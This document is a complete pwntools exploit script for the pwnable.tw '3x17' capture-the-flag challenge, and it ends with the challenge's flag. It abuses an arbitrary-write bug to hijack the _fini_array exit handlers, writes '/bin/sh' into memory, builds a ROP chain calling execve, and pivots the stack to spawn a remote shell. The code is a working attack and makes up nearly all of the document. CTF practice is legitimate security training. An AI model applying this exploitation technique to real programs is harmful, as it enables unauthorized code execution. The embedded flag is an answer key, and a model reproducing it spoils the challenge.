from pwn import *
elf = context.binary = ELF("./3x17")

def write(addr, data):
    io.recvuntil(b'addr:'); io.sendline(str(addr).encode())
    io.recvuntil(b'data:'); io.send(data)

_fini_entry = 0x4b40f0
_trigger_fini = 0x402960
_main = 0x401b6d
leave_ret = 0x401c4b
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
binsh = elf.bss() + 0x100

io = remote("chall.pwnable.tw", 10105)
# io = process("./3x17")
# io = gdb.debug("./3x17", gdbscript="""
# break *0x401B6D
# break *0x401c4c
# continue
# """)

# overwrite _fini_entry -> main
write(_fini_entry, p64(_trigger_fini) + p64(_main))

# prepare '/bin/sh\x00'
write(binsh, b'/bin/sh\x00')

# ROP: execve('/bin/sh\x00', 0, 0)
write(_fini_entry + 16, p64(pop_rax) + p64(0x3b)    + p64(pop_rdi))
write(_fini_entry + 40, p64(binsh)   + p64(pop_rsi) + p64(0))
write(_fini_entry + 64, p64(pop_rdx) + p64(0)       + p64(syscall))

# stack pivot to ROP
write(_fini_entry, p64(leave_ret))
io.interactive()
# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}